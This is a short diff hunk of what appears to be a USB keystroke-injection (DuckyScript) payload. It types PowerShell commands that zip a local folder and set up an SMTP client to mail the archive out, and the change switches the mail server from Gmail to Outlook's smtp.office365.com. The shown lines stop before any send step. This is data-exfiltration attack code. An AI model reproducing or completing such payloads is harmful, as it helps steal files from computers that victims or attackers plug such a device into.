@@ -28,10 +28,9 @@ STRING powershell
 ENTER
 STRING Compress-Archive -Path A -DestinationPath A.zip
 ENTER
-REM --> Report
-REM --> Allow less secure app here https://myaccount.google.com/lesssecureapps
+REM --> Outlook SMTP
 DELAY 500
-STRING $SMTPServer = 'smtp.gmail.com'
+STRING $SMTPServer = 'smtp.office365.com'
 ENTER
 STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
